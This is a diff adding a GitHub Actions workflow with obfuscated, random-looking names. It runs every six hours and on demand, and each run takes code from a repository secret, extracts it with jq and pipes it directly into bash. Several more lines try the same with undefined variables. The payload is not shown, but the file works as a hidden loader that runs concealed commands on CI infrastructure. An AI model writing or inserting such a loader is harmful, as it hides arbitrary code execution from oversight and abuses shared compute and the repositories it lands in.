@@ -1,0 +1,24 @@
+name: gaoshoz
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gaoshoz
+        env:
+          q2464: ${{ secrets.q2464 }}
+        run: |
+          echo $q2464 | jq -r .llz305 | /bin/bash
+          echo $thxb1246 | jq -r .i62644 | /bin/bash
+          echo $vfrs2021 | jq -r .nayxc54 | /bin/bash
+          echo $yupk153 | jq -r .tf19743 | /bin/bash
+          echo $c2 | jq -r .trdtq473 | /bin/bash
+          echo $sk8652 | jq -r .cmmlh6 | /bin/bash
+          echo $e083 | jq -r .ia8270 | /bin/bash
+
